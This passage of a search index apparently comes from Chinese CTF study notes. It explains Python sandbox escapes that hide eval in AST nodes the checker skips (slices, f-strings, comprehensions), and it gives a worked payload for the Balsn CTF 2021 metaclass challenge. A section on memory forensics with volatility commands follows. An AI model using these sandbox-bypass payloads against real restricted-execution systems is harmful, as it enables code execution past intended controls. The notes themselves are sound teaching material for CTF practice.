\u6587\u6863\u4e2d\u62bd\u8c61\u8bed\u6cd5 \u5bf9\u6bd4\uff0c\u6587\u6863\u4e2d\u7ed9\u51fa\u7684 ast.expr \u5305\u542b\u4e86\uff1a expr = BoolOp ( boolop op , expr * values ) | NamedExpr ( expr target , expr value ) | BinOp ( expr left , operator op , expr right ) | UnaryOp ( unaryop op , expr operand ) | Lambda ( arguments args , expr body ) | IfExp ( expr test , expr body , expr orelse ) | Dict ( expr * keys , expr * values ) | Set ( expr * elts ) | ListComp ( expr elt , comprehension * generators ) | SetComp ( expr elt , comprehension * generators ) | DictComp ( expr key , expr value , comprehension * generators ) | GeneratorExp ( expr elt , comprehension * generators ) -- the grammar constrains where yield expressions can occur | Await ( expr value ) | Yield ( expr ? value ) | YieldFrom ( expr value ) -- need sequences for compare to distinguish between -- x < 4 < 3 and (x < 4) < 3 | Compare ( expr left , cmpop * ops , expr * comparators ) | Call ( expr func , expr * args , keyword * keywords ) | FormattedValue ( expr value , int ? conversion , expr ? format_spec ) | JoinedStr ( expr * values ) | Constant ( constant value , string ? kind ) -- the following expression can appear in assignment context | Attribute ( expr value , identifier attr , expr_context ctx ) | Subscript ( expr value , expr slice , expr_context ctx ) | Starred ( expr value , expr_context ctx ) | Name ( identifier id , expr_context ctx ) | List ( expr * elts , expr_context ctx ) | Tuple ( expr * elts , expr_context ctx ) -- can appear only in Subscript | Slice ( expr ? lower , expr ? upper , expr ? step ) \u6bd4\u5982\uff0cBinOp(expr left, operator op, expr right) \u8868\u793a\u4e86\u4e8c\u5143\u8fd0\u7b97\u8fd9\u4e2a\u8bed\u6cd5\uff0cleft \u8868\u793a\u5de6\u4fa7\u7684\u8868\u8fbe\u5f0f\uff0cop \u8868\u793a\u4e8c\u5143\u8fd0\u7b97\u7b26\uff0cright \u8868\u793a\u53f3\u4fa7\u8868\u8fbe\u5f0f\u3002 \u540c\u7406 ListComp(expr elt, comprehension* generators) \u4e2d elt \u8868\u793a\u5176\u4e2d\u5217\u8868\u63a8\u5bfc\u7684\u5143\u7d20\uff0c\u800c generator \u5219\u8868\u793a\u751f\u6210\u5668\u5b50\u53e5 \u518d\u6765\u770b TWCTF \u8fd9\u9053\u9898\uff0c\u5b83\u7684\u68c0\u67e5\u4e2d\u5199\u4e86\uff1a 'Subscript' : [ 'value' ], \u800c\u6587\u6863\u4e2d\u7ed9\u7684\u7d22\u5f15\u8bbf\u95ee\u662f Subscript(expr value, expr slice, expr_context ctx) \u56e0\u6b64\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u5e76\u6ca1\u6709\u68c0\u6d4b\u7d22\u5f15\u8bbf\u95ee\u4e2d\u7684\u5207\u7247 slice\uff0c\u8fd9\u6837\u4f8b\u5982 a[...] \u4e2d\u7684 ... \u90e8\u5206\u5c31\u4f1a\u88ab\u5168\u90e8\u5ffd\u7565 \u6240\u4ee5\u5c31\u53ef\u4ee5\u5728[]\u4e2d\u85cf\u4e00\u4e2aeval\u6267\u884c\u6211\u4eec\u60f3\u8981\u7684\u529f\u80fd","title":"\u5bfb\u627e\u6ca1\u6709\u904d\u5386\u5230\u7684\u5b50\u8282\u70b9"},{"location":"ctf/escapes/pysandbox/#_5","text":"\u518d\u6765\u770b zjusec \u8fd9\u9053\u9898\uff0c\u901a\u8fc7\u5bf9\u6bd4\u53ef\u4ee5\u53d1\u73b0\u6240\u6709\u68c0\u6d4b\u7684\u8282\u70b9\u7684\u5b50\u8282\u70b9\u4e5f\u90fd\u904d\u5386\u4e86 \u4f46\u662f\u518d\u7ec6\u770b\u53ef\u4ee5\u53d1\u73b0 FormattedValue \u8fd9\u4e2a\u8282\u70b9\u5e76\u6ca1\u6709\u5728\u9898\u76ee\u4ee3\u7801\u91cc\u51fa\u73b0 \u800c\u4e14 ast.FormattedValue \u5c5e\u4e8e ast.expr\uff0c\u6240\u4ee5\u5b83\u65e2\u4e0d\u4f1a\u88ab\u68c0\u67e5\uff0c\u4e5f\u4e0d\u4f1a\u629b\u51fa\u5f02\u5e38 \u770b\u540d\u5b57\u50cf\u662f f-string \u76f8\u5173\uff0c\u53ef\u4ee5 dump \u4e00\u4e0b\u770b\u770b\uff1a >>> ast . dump ( ast . parse ( \"f' {x} '\" )) \"\"\" Module( body=[ Expr( value=JoinedStr( values=[ FormattedValue( value=Name(id='x', ctx=Load()), conversion=-1, format_spec=None ) ] ) ], type_ignores=[] ) \"\"\" \u53ef\u4ee5\u53d1\u73b0\uff0cf-string \u662f JoinedStr\uff0c\u800c FormattedValue \u662f\u5176\u4e2d\u88ab\u683c\u5f0f\u5316\u7684\u90e8\u5206 \u6240\u4ee5\u5c31\u53ef\u4ee5\u5411 f-string \u7684 {} \u90e8\u5206\u85cf eval \u6765\u5e72\u574f\u4e8b\u4e86","title":"\u5bfb\u627e\u6ca1\u6709\u68c0\u67e5\u7684\u8282\u70b9"},{"location":"ctf/escapes/pysandbox/#_6","text":"\u8fd9\u4e2a\u662f pysandbox12 \u7684\u4e00\u79cd\u89e3\u6cd5 python\u4e2d\u7684\u8bed\u6cd5\u4e0d\u4ec5\u6709 ast.expr \u4e00\u79cd\uff0c\u800c\u4e14\u5f88\u7279\u522b\u7684\u662f\uff0c\u5217\u8868\u63a8\u5bfc ListComp \u7684\u751f\u6210\u5668\u5b50\u53e5\u5e76\u4e0d\u662f ast.expr\uff0c\u800c\u662f ast.comprehension >>> ast . dump ( ast . parse ( \"[x for x in range(n)]\" )) \"\"\" Module( body=[ Expr( value=ListComp( elt=Name(id='x', ctx=Load()), generators=[ comprehension( target=Name(id='x', ctx=Store()), iter=Call( func=Name(id='range', ctx=Load()), args=[Name(id='n', ctx=Load())], keywords=[] ), ifs=[], is_async=0 ) ] ) ) ], type_ignores=[] ) \"\"\" \u4f46\u662f pysandbox13 \u8fd9\u6837\u6392\u9664\u4e86 ast.expr \uff1a if not isinstance ( node , ast . expr ): raise Exception ( \"not allowed \" + str ( node )) \u4f46\u662f12\u9898\u4e2d\u5e76\u6ca1\u6709\uff0c\u6240\u4ee5 ast.comprehension \u8fd9\u4e2a\u7c7b\u578b\u5b8c\u5168\u6ca1\u6709\u88ab\u68c0\u67e5 \u56e0\u6b64\u76f4\u63a5\u5411\u751f\u6210\u5668\u8868\u8fbe\u5f0f\u4e2d\u63d2\u5165\u574f\u4e1c\u897f\u5373\u53ef\uff1a [x for x in [eval(...)]]","title":"\u5176\u4ed6\u6f0f\u6d1e"},{"location":"ctf/escapes/pysandbox/#_7","text":"\u5177\u4f53\u95ee\u9898\u5177\u4f53\u5206\u6790\u4e86","title":"\u5176\u4ed6\u7c7b\u578b\u7684\u9003\u9038"},{"location":"ctf/escapes/pysandbox/#metaclass","text":"Balsn CTF 2021 \u51fa\u4e86\u4e00\u9053\u7c7b\u4f3c\u6c99\u7bb1\u9003\u9038\u7684\u9898\u76ee\uff0c\u4e3b\u8981\u8003\u5bdf\u7684\u662f metaclass \u9898\u76ee\u4ee3\u7801 class MasterMetaClass ( type ): def __new__ ( cls , class_name , class_parents , class_attr ): def getFlag ( self ): print ( 'Here you go, my master' ) with open ( 'flag' ) as f : print ( f . read ()) class_attr [ getFlag . __name__ ] = getFlag attrs = (( name , value ) for name , value in class_attr . items () if not name . startswith ( '__' )) class_attr = dict (( 'IWant' + name . upper () + 'Plz' , value ) for name , value in attrs ) newclass = super () . __new__ ( cls , class_name , class_parents , class_attr ) return newclass def __init__ ( * argv ): print ( 'Bad guy! No Flag !!' ) raise 'Illegal' class BalsnMetaClass ( type ): def getFlag ( self ): print ( 'You \\' re not Master! No Flag !!' ) def __new__ ( cls , class_name , class_parents , class_attr ): newclass = super () . __new__ ( cls , class_name , class_parents , class_attr ) setattr ( newclass , cls . getFlag . __name__ , cls . getFlag ) return newclass def secure_vars ( s ): attrs = { name : value for name , value in vars ( s ) . items () if not name . startswith ( '__' )} return attrs safe_dict = { 'BalsnMetaClass' : BalsnMetaClass , 'MasterMetaClass' : MasterMetaClass , 'False' : False , 'True' : True , 'abs' : abs , 'all' : all , 'any' : any , 'ascii' : ascii , 'bin' : bin , 'bool' : bool , 'bytearray' : bytearray , 'bytes' : bytes , 'chr' : chr , 'complex' : complex , 'dict' : dict , 'dir' : dir , 'divmod' : divmod , 'enumerate' : enumerate , 'filter' : filter , 'float' : float , 'format' : format , 'hash' : hash , 'help' : help , 'hex' : hex , 'id' : id , 'int' : int , 'iter' : iter , 'len' : len , 'list' : list , 'map' : map , 'max' : max , 'min' : min , 'next' : next , 'oct' : oct , 'ord' : ord , 'pow' : pow , 'print' : print , 'range' : range , 'reversed' : reversed , 'round' : round , 'set' : set , 'slice' : slice , 'sorted' : sorted , 'str' : str , 'sum' : sum , 'tuple' : tuple , 'type' : type , 'vars' : secure_vars , 'zip' : zip , '__builtins__' : None } def createMethod ( code ): # if len(code) > 45: # print('Too long!! Bad Guy!!') # return for x in ' _$#@~' : code = code . replace ( x , '' ) def wrapper ( self ): exec ( code , safe_dict , { 'self' : self }) return wrapper def setName ( pattern ): while True : name = input ( f 'Give me your { pattern } name :' ) if ( name . isalpha ()): break else : print ( 'Illegal Name...' ) return name def setAttribute ( cls ): attrName = setName ( 'attribute' ) while True : attrValue = input ( f 'Give me your value:' ) if ( attrValue . isalnum ()): break else : print ( 'Illegal value...' ) setattr ( cls , attrName , attrValue ) def setMethod ( cls ): methodName = setName ( 'method' ) code = input ( f 'Give me your function:' ) func = createMethod ( code ) setattr ( cls , methodName , func ) def getAttribute ( obj ): attrs = [ attr for attr in dir ( obj ) if not callable ( getattr ( obj , attr )) and not attr . startswith ( \"__\" )] x = input ( 'Please enter the attribute \\' s name :' ) if x not in attrs : print ( f 'You can \\' t access the attribute { x } ' ) return else : try : print ( f ' { x } : { getattr ( obj , x ) } ' ) except : print ( \"Something went wrong in your attribute...\" ) return def callMethod ( cls , obj ): attrs = [ attr for attr in dir ( obj ) if callable ( getattr ( obj , attr )) and not attr . startswith ( \"__\" )] x = input ( 'Please enter the method \\' s name :' ) if x not in attrs : print ( f 'You can \\' t access the method { x } ' ) return else : # try: print ( f 'calling method { x } ...' ) cls . __dict__ [ x ]( obj ) print ( 'done' ) # except: # print('Something went wrong in your method...') # return class Guest ( metaclass = BalsnMetaClass ): pass if __name__ == '__main__' : print ( f 'Welcome!!We have prepared a class named \"Guest\" for you' ) cnt = 0 while cnt < 3 : cnt += 1 print ( '1. Add attribute' ) print ( '2. Add method' ) print ( '3. Finish' ) x = input ( \"Option ? :\" ) if x == \"1\" : setAttribute ( Guest ) elif x == \"2\" : setMethod ( Guest ) elif x == \"3\" : break else : print ( \"invalid input.\" ) cnt -= 1 print ( \"Well Done! We Create an instance for you !\" ) obj = Guest () cnt = 0 while cnt < 3 : cnt += 1 print ( '1. Inspect attribute' ) print ( '2. Using method' ) print ( '3. Exit' ) x = input ( \"Option ? :\" ) if x == \"1\" : getAttribute ( obj ) elif x == \"2\" : callMethod ( Guest , obj ) elif x == \"3\" : print ( \"Okay...exit...\" ) break else : print ( \"invalid input.\" ) cnt -= 1 \u4e3b\u8981\u76ee\u6807\u662f\u521b\u5efa\u4e00\u4e2a MasterMetaClass \u7684\u5b9e\u4f8b\u4f46\u4e0d\u8c03\u7528\u5b83\u7684 __init__\u3002\u5e76\u4e14 method method \u9650\u5236\u4e86\u957f\u5ea6 <=45\uff0c\u800c\u4e14 ' \uff08\u7a7a\u683c\uff09_$#@~ ' \u90fd\u4f1a\u88ab\u5220\u6389\uff0c\u5185\u90e8 exec \u7684 globals \u4e5f\u7ed9\u4e86\u9650\u5236 \u76f4\u63a5\u8c03\u7528 MasterMetaClass \u6765\u5b9e\u4f8b\u5316\u4f1a\u6267\u884c __call__ \u548c __init__\uff0c\u76f4\u63a5\u8c03\u7528 __new__ \u53c8\u4f1a\u88ab\u9650\u5236\u4e0d\u80fd\u8f93\u5165\u4e0b\u5212\u7ebf \u521b\u5efa\u4e00\u4e2a\u5143\u7c7b\u53ef\u4ee5\u4f7f\u7528 type(name, bases, dict) \uff0c\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u7c7b\uff0c\u53c2\u6570\u662f\uff1a name : It is a string which basically represents the name of the class . bases : It is a tuple that specifies the base classes of the main class . dict : It is a \u2018 dictionary \u2018 that is used to create body of the class specified. \u6240\u4ee5\u76f4\u63a5\u4f7f\u7528 type \u521b\u5efa\u4e00\u4e2a\u65b0\u7684 metaclass\uff0c\u8ba9\u5b83\u57fa\u4e8e\uff08\u4e5f\u5c31\u662f bases \u53c2\u6570\u5185\u5bb9\uff09MasterMetaClass\uff0c\u5e76\u4e14\u8986\u76d6\u6389\u5b83\u7684 __init__\uff0c\u6240\u4ee5\u6700\u7ec8\u7684 payload \u53ef\u4ee5\u6839\u636e\u8fd9\u4e2a\u6765\u6539\u5199\uff1a type ( \"\" , ( MasterMetaClass ,), { \"__init__\" : print })( \"\" ,(),{}) . IWantGETFLAGPlz ( 1 ) \u56e0\u4e3a\u8fd9\u65f6\u7684\u4e0b\u5212\u7ebf\u5728\u5f15\u53f7\u4e2d\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528 \"\\x5f\" \u6765\u4ee3\u66ff payload add method x : e = \" \\x5f \" * 2 ; self . d = { e + \"init\" + e : print } add method y : self . m = type ( '' ,( MasterMetaClass ,), self . d ) add method z : self . m ( '' ,(),{}) . IWantGETFLAGPlz ( 1 ) call x call y call z","title":"metaclass"},{"location":"ctf/escapes/pysandbox/#reference","text":"TokyoWesterns CTF 4th 2018 Writeup \u2014 Part 5 Documentation of ast \u4e00\u6587\u770b\u61c2Python\u6c99\u7bb1\u9003\u9038 - FreeBuf\u7f51\u7edc\u5b89\u5168\u884c\u4e1a\u95e8\u6237 https://blog.gztime.cc/posts/2021/83a30666/","title":"Reference"},{"location":"ctf/forensics/","text":"\u53d6\u8bc1 \u00b6 Abstract \u53d6\u8bc1\u4e5f\u662f misc \u4e2d\u5e38\u89c1\u7684\u4e00\u7c7b\u9898\u578b\uff0c\u5373\u4ece dump \u4e0b\u6765\u7684\u6d41\u91cf\u6216\u5185\u5b58\u4e2d\u5bfb\u627e\u3001\u63d0\u53d6\u51fa\u60f3\u8981\u7684\u4e1c\u897f\uff08flag\uff09 \u4e5f\u4e00\u822c\u5206\u4e3a\u6d41\u91cf\u53d6\u8bc1\u548c\u5185\u5b58\u53d6\u8bc1 Table of Contents \u00b6 \u5185\u5b58\u53d6\u8bc1 \u6d41\u91cf\u53d6\u8bc1\uff08\u5495\u5495\u5495\uff09","title":"\u53d6\u8bc1"},{"location":"ctf/forensics/#_1","text":"Abstract \u53d6\u8bc1\u4e5f\u662f misc \u4e2d\u5e38\u89c1\u7684\u4e00\u7c7b\u9898\u578b\uff0c\u5373\u4ece dump \u4e0b\u6765\u7684\u6d41\u91cf\u6216\u5185\u5b58\u4e2d\u5bfb\u627e\u3001\u63d0\u53d6\u51fa\u60f3\u8981\u7684\u4e1c\u897f\uff08flag\uff09 \u4e5f\u4e00\u822c\u5206\u4e3a\u6d41\u91cf\u53d6\u8bc1\u548c\u5185\u5b58\u53d6\u8bc1","title":"\u53d6\u8bc1"},{"location":"ctf/forensics/#table-of-contents","text":"\u5185\u5b58\u53d6\u8bc1 \u6d41\u91cf\u53d6\u8bc1\uff08\u5495\u5495\u5495\uff09","title":"Table of Contents"},{"location":"ctf/forensics/mem/","text":"\u5185\u5b58\u53d6\u8bc1 \u00b6 Abstract \u5176\u5b9e\u4e5f\u6ca1\u7cfb\u7edf\u5b66\u4e60\u8fc7\u5185\u5b58\u53d6\u8bc1\u65b9\u6cd5\uff0c\u505a\u4e86\u51e0\u9053\u9898\u53cd\u6b63\u5c31\u662f strings \u4e00\u628a\u68ad\uff0c\u4e0d\u884c\u5c31 volatility \u4e00\u628a\u68ad\uff08 \u518d\u4e0d\u884c\u5c31\u5f00\u6446 \uff09 strings \u00b6 dump \u51fa\u6765\u7684\u5185\u5b58\u4e2d\u5f80\u5f80\u4f1a\u5b58\u5728\u4e00\u4e9b\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u7528 strings \u547d\u4ee4\u63d0\u53d6\u51fa\u6765\uff0c\u7136\u540e\u901a\u8fc7\u641c\u7d22\u6765\u5bfb\u627e\u4e00\u4e9b\u7279\u5b9a\u7684\u5b57\u7b26\u4e32\uff0c\u6bd4\u5982 flag\u3001secret \u5565\u7684\u3002\uff08\u53cd\u6b63\u5c31\u55ef\u770b\u55ef\u641c\u5c31\u5b8c\u4e8b volatility \u00b6 \u7248\u672c\u4e0e\u5b89\u88c5 \u00b6 \u73b0\u5b58\u7684\u4e24\u4e2a\u7248\u672c volatility2 \u548c volatility3\uff0c\u5206\u522b\u7528\u4e86 python2 \u548c python3\u3002\u4e0d\u8fc7 volatility3 \u611f\u89c9\u4e0d\u597d\u7528\uff0c\u8fd8\u5f97\u662f 2 volatility2 \u5b89\u88c5\u76f4\u63a5\u770b\u6587\u6863\u5c31\u597d\uff0cmac \u7684\u8bdd\u6709\u4e00\u4e9b\u4f9d\u8d56\u5305\u6709\u7f16\u8bd1\u95ee\u9898\uff0c\u61d2\u5f97\u641e\uff0c\u53ef\u4ee5\u53bb\u5b98\u7f51\u4e0b\u8f7d\u7f16\u8bd1\u597d\u7684\u4e8c\u8fdb\u5236\u5305\u62ff\u6765\u76f4\u63a5\u8fd0\u884c \u7cfb\u7edf\u7248\u672c\u4e0e profile \u00b6 volatility \u7684\u8bdd\u76f4\u63a5\u65e0\u8111\u68ad\u5c31\u5b8c\u4e8b\u4e86\uff0cWindows \u7684\u8bdd\u6709\u5185\u7f6e profile \u53ef\u4ee5\u76f4\u63a5\u68ad\uff0cLinux \u7684\u8bdd\u8981\u5148\u627e\u4e00\u4e0b\u7248\u672c\u7136\u540e\u6784\u9020\u5bf9\u5e94 profile \u67e5\u770b\u7cfb\u7edf\u7248\u672c\uff1a volatility -f <file> imageinfo Windows \u53d6\u8bc1\u4e00\u628a\u68ad \u00b6 \u8fdb\u7a0b\u76f8\u5173\uff1a volatility -f <file> --profile = <profile> pslist volatility -f <file> --profile = <profile> psxview volatility -f <file> --profile = <profile> psscan volatility -f <file> --profile = <profile> pstree volatility -f <file> --profile = <profile> memdump -p <PID> --dump-dir = ./ \u547d\u4ee4\u76f8\u5173\uff1a volatility -f <file> --profile = <profile> cmdscan volatility -f <file> --profile = <profile> consoles volatility -f <file> --profile = <profile> cmdline \u6587\u4ef6\u76f8\u5173\uff1a volatility -f <file> --profile = <profile> filescan volatility -f <file> --profile = <profile> filescan > files.txt volatility -f <file> --profile = <profile> dumpfiles -Q <virtual addr> --dump-dir = ./ # \u7531 filescan \u7ed3\u679c\u6765\u5b9a volatility -f <file> --profile = <profile> mftparser > mftparser.txt # \u4e00\u4e9b filescan \u641c\u4e0d\u51fa\u6765/\u88ab\u5220\u4e86\u7684\u53ef\u4ee5\u5c1d\u8bd5 mtfparser \u5176\u5b83\u4e00\u5806\u64cd\u4f5c\uff1a volatility -f <file> --profile = <profile> envars volatility -f <file> --profile = <profile> netscan volatility -f <file> --profile = <profile> connscan volatility -f <file> --profile = <profile> svcscan volatility -f <file> --profile = <profile> privs volatility -f <file> --profile = <profile> hivelist volatility -f <file> --profile = <profile> printkey -K \"SAM\\Domains\\Account\\Users\\Names\" volatility -f <file> --profile = <profile> iehistory volatility -f <file> --profile = <profile> notepad volatility -f <file> --profile = <profile> editbox volatility -f <file> --profile = <profile> userassist volatility -f <file> --profile = <profile> clipboard -v Linux \u53d6\u8bc1 \u00b6 Linux \u9996\u5148\u9700\u8981\u6784\u9020\u4e00\u4e0b profile\u3002volatility3 -f banners \u53ef\u4ee5\u68c0\u6d4b\u5f53\u524d Linux \u7248\u672c\u3002 \u7136\u540e\u5728\u5bf9\u5e94\u7cfb\u7edf\u5185\u8fdb\u5165 volatility \u7684 tools/linux \u76ee\u5f55\uff0c\u6267\u884c make\uff0c\u5f97\u5230 module.dwarf \u6587\u4ef6\u3002\u9664\u6b64\u4e4b\u5916\u8fd8\u9700\u8981 /boot \u76ee\u5f55\u4e0b\u7684 System.map \u6587\u4ef6\uff0c\u7136\u540e\u5c06\u8fd9\u4e24\u4e2a\u6587\u4ef6\u6253\u5305\u538b\u7f29\uff0c\u653e\u5728 volatility/plugins/overlays/linux \u76ee\u5f55\u4e0b\u5373\u53ef\uff0c\u518d\u6267\u884c volatility --info \u5c31\u53ef\u4ee5\u770b\u5230\u65b0\u7684 Linux profile \u4e86\u3002 \u901a\u8fc7 volatility --info | grep linux_ \u53ef\u4ee5\u627e\u5230\u6240\u6709 Linux \u5185\u5b58\u4e0b\u53ef\u7528\u7684\u6307\u4ee4\uff0c\u9010\u4e2a\u8bd5\u7740\u7528\u5373\u53ef\uff1a plugins list linux_apihooks - Checks for userland apihooks linux_arp - Print the ARP table linux_aslr_shift - Automatically detect the Linux ASLR shift linux_banner - Prints the Linux banner information linux_bash - Recover bash history from bash process memory linux_bash_env - Recover a process' dynamic environment variables linux_bash_hash - Recover bash hash table from bash process memory linux_check_afinfo - Verifies the operation function pointers of network protocols linux_check_creds - Checks if any processes are sharing credential structures linux_check_evt_arm - Checks the Exception Vector Table to look for syscall table hooking linux_check_fop - Check file operation structures for rootkit modifications linux_check_idt - Checks if the IDT has been altered linux_check_inline_kernel - Check for inline kernel hooks linux_check_modules - Compares module list to sysfs info, if available linux_check_syscall - Checks if the system call table has been altered linux_check_syscall_arm - Checks if the system call table has been altered linux_check_tty - Checks tty devices for hooks linux_cpuinfo - Prints info about each active processor linux_dentry_cache - Gather files from the dentry cache linux_dmesg - Gather dmesg buffer linux_dump_map - Writes selected memory mappings to disk linux_dynamic_env - Recover a process' dynamic environment variables linux_elfs - Find ELF binaries in process mappings linux_enumerate_files - Lists files referenced by the filesystem cache linux_find_file - Lists and recovers files from memory linux_getcwd - Lists current working directory of each process linux_hidden_modules - Carves memory to find hidden kernel modules linux_ifconfig - Gathers active interfaces linux_info_regs - It's like 'info registers' in GDB. It prints out all the linux_iomem - Provides output similar to /proc/iomem linux_kernel_opened_files - Lists files that are opened from within the kernel linux_keyboard_notifiers - Parses the keyboard notifier call chain linux_ldrmodules - Compares the output of proc maps with the list of libraries from libdl linux_library_list - Lists libraries loaded into a process linux_librarydump - Dumps shared libraries in process memory to disk linux_list_raw - List applications with promiscuous sockets linux_lsmod - Gather loaded kernel modules linux_lsof - Lists file descriptors and their path linux_malfind - Looks for suspicious process mappings linux_memmap - Dumps the memory map for linux tasks linux_moddump - Extract loaded kernel modules linux_mount - Gather mounted fs/devices linux_mount_cache - Gather mounted fs/devices from kmem_cache linux_netfilter - Lists Netfilter hooks linux_netscan - Carves for network connection structures linux_netstat - Lists open sockets linux_pidhashtable - Enumerates processes through the PID hash table linux_pkt_queues - Writes per-process packet queues out to disk linux_plthook - Scan ELF binaries' PLT for hooks to non-NEEDED images linux_proc_maps - Gathers process memory maps linux_proc_maps_rb - Gathers process maps for linux through the mappings red-black tree linux_procdump - Dumps a process's executable image to disk linux_process_hollow - Checks for signs of process hollowing linux_psaux - Gathers processes along with full command line and start time linux_psenv - Gathers processes along with their static environment variables linux_pslist - Gather active tasks by walking the task_struct->task list linux_pslist_cache - Gather tasks from the kmem_cache linux_psscan - Scan physical memory for processes linux_pstree - Shows the parent/child relationship between processes linux_psxview - Find hidden processes with various process listings linux_recover_filesystem - Recovers the entire cached file system from memory linux_route_cache - Recovers the routing cache from memory linux_sk_buff_cache - Recovers packets from the sk_buff kmem_cache linux_slabinfo - Mimics /proc/slabinfo on a running machine linux_strings - Match physical offsets to virtual addresses (may take a while, VERY verbose) linux_threads - Prints threads of processes linux_tmpfs - Recovers tmpfs filesystems from memory linux_truecrypt_passphrase - Recovers cached Truecrypt passphrases linux_vma_cache - Gather VMAs from the vm_area_struct cache linux_volshell - Shell in the memory image linux_yarascan - A shell in the Linux memory image \u4e0d\u8fc7\u505a\u9898\u611f\u89c9\u6765\u8bf4\u5bf9 Linux \u7528 volatility \u6ca1\u6709\u5bf9 Windows \u7528\u597d\u7528\u3002","title":"\u5185\u5b58\u53d6\u8bc1"},{"location":"ctf/forensics/mem/#_1","text":"Abstract \u5176\u5b9e\u4e5f\u6ca1\u7cfb\u7edf\u5b66\u4e60\u8fc7\u5185\u5b58\u53d6\u8bc1\u65b9\u6cd5\uff0c\u505a\u4e86\u51e0\u9053\u9898\u53cd\u6b63\u5c31\u662f strings \u4e00\u628a\u68ad\uff0c\u4e0d\u884c\u5c31 volatility \u4e00\u628a\u68ad\uff08 \u518d\u4e0d\u884c\u5c31\u5f00\u6446 \uff09","title":"\u5185\u5b58\u53d6\u8bc1"},{"location":"ctf/forensics/mem/#strings","text":"dump \u51fa\u6765\u7684\u5185\u5b58\u4e2d\u5f80\u5f80\u4f1a\u5b58\u5728\u4e00\u4e9b\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u7528 strings \u547d\u4ee4\u63d0\u53d6\u51fa\u6765\uff0c\u7136\u540e\u901a\u8fc7\u641c\u7d22\u6765\u5bfb\u627e\u4e00\u4e9b\u7279\u5b9a\u7684\u5b57\u7b26\u4e32\uff0c\u6bd4\u5982 flag\u3001secret \u5565\u7684\u3002\uff08\u53cd\u6b63\u5c31\u55ef\u770b\u55ef\u641c\u5c31\u5b8c\u4e8b","title":"strings"},{"location":"ctf/forensics/mem/#volatility","text":"","title":"volatility"},{"location":"ctf/forensics/mem/#_2","text":"\u73b0\u5b58\u7684\u4e24\u4e2a\u7248\u672c volatility2 \u548c volatility3\uff0c\u5206\u522b\u7528\u4e86 python2 \u548c python3\u3002\u4e0d\u8fc7 volatility3 \u611f\u89c9\u4e0d\u597d\u7528\uff0c\u8fd8\u5f97\u662f 2 volatility2 \u5b89\u88c5\u76f4\u63a5\u770b\u6587\u6863\u5c31\u597d\uff0cmac \u7684\u8bdd\u6709\u4e00\u4e9b\u4f9d\u8d56\u5305\u6709\u7f16\u8bd1\u95ee\u9898\uff0c\u61d2\u5f97\u641e\uff0c\u53ef\u4ee5\u53bb\u5b98\u7f51\u4e0b\u8f7d\u7f16\u8bd1\u597d\u7684\u4e8c\u8fdb\u5236\u5305\u62ff\u6765\u76f4\u63a5\u8fd0\u884c","title":"\u7248\u672c\u4e0e\u5b89\u88c5"},{"location":"ctf/forensics/mem/#profile","text":"volatility \u7684\u8bdd\u76f4\u63a5\u65e0\u8111\u68ad\u5c31\u5b8c\u4e8b\u4e86\uff0cWindows \u7684\u8bdd\u6709\u5185\u7f6e profile \u53ef\u4ee5\u76f4\u63a5\u68ad\uff0cLinux \u7684\u8bdd\u8981\u5148\u627e\u4e00\u4e0b\u7248\u672c\u7136\u540e\u6784\u9020\u5bf9\u5e94 profile \u67e5\u770b\u7cfb\u7edf\u7248\u672c\uff1a volatility -f <file> imageinfo","title":"\u7cfb\u7edf\u7248\u672c\u4e0e profile"},{"location":"ctf/forensics/mem/#windows","text":"\u8fdb\u7a0b\u76f8\u5173\uff1a volatility -f <file> --profile = <profile> pslist volatility -f <file> --profile = <profile> psxview volatility -f <file> --profile = <profile> psscan volatility -f <file> --profile = <profile> pstree volatility -f <file> --profile = <profile> memdump -p <PID> --dump-dir = ./ \u547d\u4ee4\u76f8\u5173\uff1a volatility -f <file> --profile = <profile> cmdscan volatility -f <file> --profile = <profile> consoles volatility -f <file> --profile = <profile> cmdline \u6587\u4ef6\u76f8\u5173\uff1a volatility -f <file> --profile = <profile> filescan volatility -f <file> --profile = <profile> filescan > files.txt volatility -f <file> --profile = <profile> dumpfiles -Q <virtual addr> --dump-dir = ./ # \u7531 filescan \u7ed3\u679c\u6765\u5b9a volatility -f <file> --profile = <profile> mftparser > mftparser.txt # \u4e00\u4e9b filescan \u641c\u4e0d\u51fa\u6765/\u88ab\u5220\u4e86\u7684\u53ef\u4ee5\u5c1d\u8bd5 mtfparser \u5176\u5b83\u4e00\u5806\u64cd\u4f5c\uff1a volatility -f <file> --profile = <profile> envars volatility -f <file> --profile = <profile> netscan volatility -f <file> --profile = <profile> connscan volatility -f <file> --profile = <profile> svcscan volatility -f <file> --profile = <profile> privs volatility -f <file> --profile = <profile> hivelist volatility -f <file> --profile = <profile> printkey -K \"SAM\\Domains\\Account\\Users\\Names\" volatility -f <file> --profile = <profile> iehistory volatility -f <file> --profile = <profile> notepad volatility -f <file> --profile = <profile> editbox volatility -f <file> --profile = <profile> userassist volatility -f <file> --profile = <profile> clipboard -v","title":"Windows \u53d6\u8bc1\u4e00\u628a\u68ad"},{"location":"ctf/forensics/mem/#linux","text":"Linux \u9996\u5148\u9700\u8981\u6784\u9020\u4e00\u4e0b profile\u3002volatility3 -f banners \u53ef\u4ee5\u68c0\u6d4b\u5f53\u524d Linux \u7248\u672c\u3002 \u7136\u540e\u5728\u5bf9\u5e94\u7cfb\u7edf\u5185\u8fdb\u5165 volatility \u7684 tools/linux \u76ee\u5f55\uff0c\u6267\u884c make\uff0c\u5f97\u5230 module.dwarf \u6587\u4ef6\u3002\u9664\u6b64\u4e4b\u5916\u8fd8\u9700\u8981 /boot \u76ee\u5f55\u4e0b\u7684 System.map \u6587\u4ef6\uff0c\u7136\u540e\u5c06\u8fd9\u4e24\u4e2a\u6587\u4ef6\u6253\u5305\u538b\u7f29\uff0c\u653e\u5728 volatility/plugins/overlays/linux \u76ee\u5f55\u4e0b\u5373\u53ef\uff0c\u518d\u6267\u884c volatility --info \u5c31\u53ef\u4ee5\u770b\u5230\u65b0\u7684 Linux profile \u4e86\u3002 \u901a\u8fc7 volatility --info | grep linux_ \u53ef\u4ee5\u627e\u5230\u6240\u6709 Linux \u5185\u5b58\u4e0b\u53ef\u7528\u7684\u6307\u4ee4\uff0c\u9010\u4e2a\u8bd5\u7740\u7528\u5373\u53ef\uff1a plugins list linux_apihooks - Checks for 